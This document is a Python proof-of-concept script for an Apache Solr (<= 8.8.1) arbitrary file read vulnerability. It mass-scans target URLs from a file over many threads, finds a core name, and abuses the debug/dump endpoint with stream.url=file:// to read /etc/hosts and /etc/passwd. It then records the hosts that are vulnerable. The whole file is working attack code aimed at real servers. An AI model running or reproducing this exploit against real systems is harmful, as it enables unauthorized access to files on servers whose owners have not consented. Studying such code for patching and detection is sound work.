#!/usr/bin/python3.7
# -*- coding: utf-8 -*-
# @Author  : Cr4y0n
# @Software: PyCharm
# @Time    : 2021/03/23

import os
import json
import time
import requests
from threading import Lock
from concurrent.futures import ThreadPoolExecutor
from argparse import ArgumentParser

requests.packages.urllib3.disable_warnings()

class ApacheSolrReadAnyFile:
    def __init__(self):
        self.banner()
        self.args = self.parseArgs()
        self.init()
        self.urlList = self.loadURL()  # 所有目标
        self.multiRun()
        self.start = time.time()

    def banner(self):
        logo = r"""
      _____       _      _____                _                      ______ _ _
     / ____|     | |    |  __ \              | |   /\               |  ____(_) |
    | (___   ___ | |_ __| |__) |___  __ _  __| |  /  \   _ __  _   _| |__   _| | ___
     \___ \ / _ \| | '__|  _  // _ \/ _` |/ _` | / /\ \ | '_ \| | | |  __| | | |/ _ \
     ____) | (_) | | |  | | \ \  __/ (_| | (_| |/ ____ \| | | | |_| | |    | | |  __/
    |_____/ \___/|_|_|  |_|  \_\___|\__,_|\__,_/_/    \_\_| |_|\__, |_|    |_|_|\___|   POC
                                                                __/ |
                                                               |___/         Author: Cr4y0n
        """
        msg = "Apache Solr <= 8.8.1 Can Read Any File.\n"
        print("\033[91m" + logo + "\033[0m")
        print(msg)

    def init(self):
        print("\nthread:", self.args.Thread)
        print("timeout:", self.args.timeout)
        msg = ""
        if os.path.isfile(self.args.file):
            msg += "Load url file successfully\n"
        else:
            msg += f"\033[31mLoad url file {self.args.file} failed\033[0m\n"
        print(msg)
        if "failed" in msg:
            print("Init failed, Please check the environment.")
            os._exit(0)
        print("Init successfully")

    def parseArgs(self):
        date = time.strftime("%Y-%m-%d_%H-%M-%S", time.localtime())
        parser = ArgumentParser()
        parser.add_argument("-f", "--file", required=False, type=str, default=f"./url.txt", help=f"The url file, default is ./url.txt")
        parser.add_argument("-T", "--Thread", required=False, type=int, default=32, help=f"Number of thread, default is 32")
        parser.add_argument("-t", "--timeout", required=False, type=int, default=3,  help="request timeout(default 3)")
        parser.add_argument("-o", "--output", required=False, type=str, default=date,  help="Vuln url output file, default is {date}.txt")
        return parser.parse_args()

    # 验证漏洞
    def verify(self, url):
        msg = ""
        try:
            reqURL = url + "/solr/admin/cores?indexInfo=false&wt=json"
            rep = requests.get(url=reqURL, timeout=self.args.timeout, verify=False)
            name = list(json.loads(rep.text)["status"])[0]
        except IndexError:
            msg = f"[-] [ Safe ]  {url}"
        except:
            msg = f"\033[31m[!] [ Conn ]  {url}\033[0m"
        if msg:
            self.lock.acquire()
            try:
                print(msg)
            finally:
                self.lock.release()
            return
        if "127.0.0.1" in self.readFile(url, name, "/etc/hosts"):
            msg = f"\033[32m[+] [ Vuln ]  {url}\033[0m"
            self.lock.acquire()
            try:
                self.findCount += 1
                self.vulnRULList.append(url)
            finally:
                self.lock.release()
        else:
            if "root" in self.readFile(url, name, "/etc/passwd"):
                msg = f"\033[32m[+] [ Vuln ]  {url}\033[0m"
                self.lock.acquire()
                try:
                    self.findCount += 1
                    self.vulnRULList.append(url)
                finally:
                    self.lock.release()
            else:
                msg = f"[-] [ Safe ]  {url}"
        self.lock.acquire()
        try:
            print(msg)
        finally:
            self.lock.release()

    # 利用漏洞读取文件
    def readFile(self, url, name, filename):
        reqURL = url + "/solr/" + name + "/debug/dump?param=ContentStreams&wt=json"
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        postData = "stream.url=file://" + filename
        try:
            rep = requests.get(url=reqURL, headers=headers, data=postData, timeout=self.args.timeout, verify=False)
            repData = str(rep.text)
            fileData = json.loads(repData)["streams"][0]["stream"]
            return fileData
        except:
            return ""

    # 加载url地址
    def loadURL(self):
        urlList = []
        with open(self.args.file, encoding="utf8") as f:
            for line in f.readlines():
                line = line.strip()
                if "https://" in line:
                    line = line.replace("https://", "http://")
                if "http://" not in line:
                    line = f"http://{line}"
                urlList.append(line)
        return urlList

    # 多线程运行
    def multiRun(self):
        self.findCount = 0
        self.vulnRULList = []
        self.lock = Lock()
        executor = ThreadPoolExecutor(max_workers=self.args.Thread)
        executor.map(self.verify, self.urlList)

    # 输出到文件
    def output(self):
        if not os.path.isdir(r"./output"):
            os.mkdir(r"./output")
        self.outputFile = f"./output/{self.args.output}.txt"
        with open(self.outputFile, "a") as f:
            for url in self.vulnRULList:
                f.write(url + "\n")

    def __del__(self):
        try:
            print("\nattemptCount：\033[31m%d\033[0m   findCount：\033[32m%d\033[0m" % (len(self.urlList), self.findCount))
            self.end = time.time()
            print("Time Spent: %.2f" % (self.end - self.start))
            self.output()
            print("-" * 20, f"\nThe vulnURL has been saved in {self.outputFile}\n")
        except:
            pass

if __name__ == "__main__":
    ApacheSolrReadAnyFile()


